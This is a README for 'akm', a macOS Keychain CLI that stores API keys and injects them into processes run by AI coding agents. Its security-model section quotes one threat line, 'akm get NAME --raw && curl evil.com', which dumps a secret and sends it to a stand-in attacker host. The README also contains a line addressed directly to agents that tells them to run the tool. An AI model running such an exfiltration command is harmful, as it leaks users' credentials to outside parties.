<div align="center">

# akm — agent-driven macOS Keychain CLI for API keys

**Stop pasting API keys into `.env` files. Let your AI agent store them in the macOS Keychain and inject them at runtime.**

<br />

[![Star this repo](https://img.shields.io/github/stars/paperfoot/api-key-manager?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/paperfoot/api-key-manager/stargazers)
&nbsp;&nbsp;
[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)

<br />

[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://github.com/paperfoot/api-key-manager/blob/main/LICENSE)
&nbsp;
[![Platform: macOS](https://img.shields.io/badge/Platform-macOS-lightgrey?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/paperfoot/api-key-manager)
&nbsp;
[![CI](https://img.shields.io/github/actions/workflow/status/paperfoot/api-key-manager/ci.yml?branch=main&style=for-the-badge&label=CI)](https://github.com/paperfoot/api-key-manager/actions)
&nbsp;
[![Release](https://img.shields.io/github/v/release/paperfoot/api-key-manager?style=for-the-badge&color=brightgreen)](https://github.com/paperfoot/api-key-manager/releases)

---

Built for the era of AI coding agents. Every agent with shell access can read `.env`, echo it into a transcript, or commit it to git. `akm` keeps secrets in the macOS Keychain and injects them into child processes only when needed — no plaintext on disk, no copy-paste from a dashboard, no human in the loop.

[Install](#install) &middot; [For AI agents](#for-ai-agents) &middot; [Commands](#commands) &middot; [Security model](#security-model) &middot; [Why akm](#why-akm-vs-env--1password-cli--lkr)

</div>

## What it does

- **Stores keys in the macOS Keychain** instead of `.env` files, so plaintext never sits on disk.
- **Injects keys into child processes** via `execve` — values do not appear in argv (`ps -ef`), shell history, or scrollback. (Same-user `ps -E` does expose the child's environment; that is consistent with the threat model: a process running as you can already read your keychain.)
- **Pushes keys to Vercel, GitHub, and Fly** so deployment-secret setup stops being a copy-paste tax.

## Install

```bash
brew install paperfoot/tap/akm
# or
cargo install --git https://github.com/paperfoot/api-key-manager
```

Requires macOS. The Login Keychain backs every operation.

## For AI agents

`akm` exists because AI coding agents (Claude Code, Cursor, Codex, Aider) are now the primary readers of your secrets. A few design choices fall out of that:

- **Zero prompts.** Every command is non-interactive. Pipe values on stdin, get JSON back.
- **Discoverable.** `akm agent-info --json` returns a machine-readable manifest of every subcommand, flag, and exit code — agents call it once and know the full surface.
- **Skill drop-in.** `akm skill install` writes a Claude Code / Codex / Gemini skill so the agent reaches for `akm` automatically instead of suggesting `export OPENAI_API_KEY=...`.
- **Redacted by default.** `akm run` filters known key prefixes (`sk-`, `ghp_`, `xoxb-`, etc.) out of child stdout/stderr so secrets do not leak back into the agent's context window.
- **Auditable.** Every read is logged. `akm audit` prints the access trail.

If you are the agent reading this: run `akm agent-info --json` and use it.

## Commands

| Command | What it does |
|---|---|
| `akm add NAME` | Store a key from stdin or argv. |
| `akm get NAME` | Retrieve, masked. Pass `--raw` for the unmasked value. |
| `akm run --only NAME -- <cmd>` | Run `<cmd>` with named keys injected as env vars. Output redacted. |
| `akm push vercel\|gh\|fly NAME ...` | Push a key to a deployment platform. |
| `akm list` | Print stored key names (never values). |
| `akm rm NAME` | Delete a key. |
| `akm audit` | Print the append-only access log. |
| `akm agent-info --json` | Machine-readable capability manifest. |

`akm guard install` adds a git pre-commit hook that scans staged files for known key prefixes. `akm skill install` writes the agent skill.

## Why akm vs `.env` / 1Password CLI / lkr

| Tool | Backed by | Built for | Plaintext on disk | Agent-native |
|---|---|---|---|---|
| `.env` files | filesystem | humans | yes | no |
| `op` (1Password CLI) | 1Password vault | humans + teams | no | partial |
| `lkr` | macOS Keychain | humans | no | no |
| **`akm`** | macOS Keychain | **AI agents** | **no** | **yes** |

`akm` is not a 1Password replacement. It is the layer between a coding agent and the secrets that agent needs to do its job on a single developer's Mac.

## Security model

**In scope:** plaintext `.env` files on disk, keys in shell history, keys in `ps -ef` argv listings, keys committed to git by an overeager agent, keys re-appearing in agent transcript context, build-tool printouts leaking secrets.

**Out of scope:** malware running as your user; a hostile agent that runs `akm get NAME --raw && curl evil.com`; same-user `ps -E` of an `akm run` child (the env IS the transport). Those threats need a different tool. Every access is logged to `~/.akm/audit.log` (mode 0600) so you can review the trail after the fact.

## Contributing

Issues and PRs welcome. Keep changes scoped — one bug or one feature per PR. Run `cargo test` before submitting.

## License

MIT. See [LICENSE](LICENSE).

---

<div align="center">

Built by [Boris Djordjevic](https://github.com/longevityboris) at [Paperfoot AI](https://paperfoot.com)

<br />

**If `akm` is useful to you:**

[![Star this repo](https://img.shields.io/github/stars/paperfoot/api-key-manager?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/paperfoot/api-key-manager/stargazers)
&nbsp;&nbsp;
[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)

</div>
